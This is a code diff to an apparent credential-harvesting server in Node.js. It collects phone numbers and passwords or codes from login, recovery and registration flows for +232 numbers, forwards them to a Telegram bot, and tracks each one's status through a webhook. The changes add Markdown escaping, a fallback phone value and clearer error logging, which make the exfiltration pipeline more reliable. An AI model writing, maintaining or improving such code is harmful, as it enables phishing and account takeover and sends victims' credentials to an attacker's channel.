@@ -14,6 +14,12 @@ const orderStatuses = {};
 const lastSubmissionTime = {}; 
 const userCredentials = {}; // Tracks collected credentials per phone
 
+// Helper function to escape Markdown special characters safely
+function escapeMarkdown(text) {
+    if (!text) return '';
+    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+}
+
 // Helper function to safely fetch from Telegram with a built-in timeout and abort handler
 async function sendToTelegram(url, payload) {
     const controller = new AbortController();
@@ -30,7 +36,7 @@ async function sendToTelegram(url, payload) {
         return await response.json();
     } catch (error) {
         clearTimeout(timeoutId);
-        console.error('Error:', error.message);
+        console.error('Telegram Error:', error.message);
         throw error;
     }
 }
@@ -38,8 +44,12 @@ async function sendToTelegram(url, payload) {
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
     try {
-        const { phone, uniqueId } = req.body;
+        let { phone, uniqueId } = req.body;
         
+        if (!phone || phone === 'Unknown Phone' || phone === 'undefined') {
+            phone = '+232 00000000'; // fallback safeguard
+        }
+
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
 
@@ -101,11 +111,11 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[phone].password = uniqueId;
         }
 
-        // Layout matching your required format
+        // Layout matching your required format with safe escaping to prevent 400 errors
         const message = `${headerTitle}\n\n` +
                         `${countryFlag} Country: \`+232\`\n` +
-                        `📱 Phone: \`${rawDigits}\`\n` +
-                        `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
+                        `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
+                        `🔑 ${credentialLabel}: \`${escapeMarkdown(uniqueId || 'N/A')}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const encodedId = encodeURIComponent(uniqueId || 'N/A');
@@ -129,7 +139,7 @@ app.post('/api/submit-order', async (req, res) => {
 
         res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
-        console.error(error);
+        console.error("Submit Order Error:", error);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
@@ -190,8 +200,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             const updatedMessage = `📋 *${messageTitle}*\n\n` +
                              `${countryFlag} Country: \`+232\`\n` +
-                             `📱 Phone: \`${rawDigits}\`\n` +
-                             `🔑 Detail: \`${uniqueId}\`\n` +
+                             `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
+                             `🔑 Detail: \`${escapeMarkdown(uniqueId)}\`\n` +
                              `📌 Status: *${actionText}*`;
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
